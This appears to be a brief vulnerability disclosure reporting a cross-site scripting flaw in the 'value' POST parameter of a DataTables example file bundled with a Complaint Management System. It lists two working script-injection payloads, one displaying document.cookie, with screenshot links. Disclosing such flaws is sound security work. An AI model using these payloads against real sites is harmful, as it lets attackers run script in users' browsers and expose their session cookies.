BUG_Author: 1406213367

Vulnerability File: /Complaint Management System/admin/assets/plugins/DataTables/examples/examples_support/editable_ajax.php

POST parameter 'value' exists XSS vulnerability

Payload1:value=1><script>alert(666)</script>

![image](https://github.com/1406213367/bug_report/blob/main/xss1.png)

Payload2:value=1><script>alert(document.cookie)</script>

![image](https://github.com/1406213367/bug_report/blob/main/xss2.png)
